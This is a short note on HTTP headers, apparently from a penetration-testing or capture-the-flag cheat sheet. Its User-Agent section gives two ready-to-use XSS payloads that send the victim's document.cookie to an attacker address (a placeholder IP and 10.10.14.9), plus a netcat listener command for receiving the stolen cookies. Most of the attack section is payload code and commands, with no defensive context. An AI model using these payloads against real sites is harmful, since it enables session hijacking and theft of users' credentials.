# Headers

HTTP headers contain metadata in key-value pairs that are sent along with HTTP requests and responses. They can be used to define caching behavior, facilitate authentication, and manage session state. HTTP headers help the API client and server communicate more effectively—and enable developers to optimize and customize the API’s behavior.

## User-Agent

We can do a XSS attack by changing the User-Agent header to a malicious payload. For example, we can use the following payload to steal the cookie:

```bash
User-Agent: <script>document.location='<IP>/?c='+document.cookie</script>
User-Agent: <img src=x onerror="this.src='http://10.10.14.9/?c='+document.cookie;"/>
```

Before this, we should have netcat listening on port 80:

```bash
nc -lvnp 80
```